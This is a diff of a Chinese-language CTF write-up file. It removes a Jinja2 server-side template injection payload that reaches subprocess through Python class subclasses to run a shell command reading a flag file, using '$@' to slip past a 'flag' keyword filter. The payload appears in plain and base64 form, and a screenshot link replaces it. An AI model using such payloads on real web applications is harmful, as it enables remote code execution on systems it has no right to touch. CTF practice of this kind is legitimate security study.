@@ -4770,12 +4770,7 @@ hint：my fav word in my fav paper? !,my love is…?, the password is password;
 
 最后的RCE发现对`flag`也是做了过滤的，翻了一下葵花宝典，也是用`$@`绕过去了，最后flag
 
-```
-{% print(''.__class__.__base__.__subclasses__()[286]('cat /this_is_the_fl$@ag.txt',shell=True,stdout=-1).communicate()[0].strip()) %}
-
-base64编码：
-eyUgcHJpbnQoJycuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKClbMjg2XSgnY2F0IC90aGlzX2lzX3RoZV9mbCRAYWcudHh0JyxzaGVsbD1UcnVlLHN0ZG91dD0tMSkuY29tbXVuaWNhdGUoKVswXS5zdHJpcCgpKSAlfQ==
-```
+![image-20240223155854506](CTF.assets/image-20240223155854506.png)
 
 ## BUUOJ [MRCTF2020]套娃
 
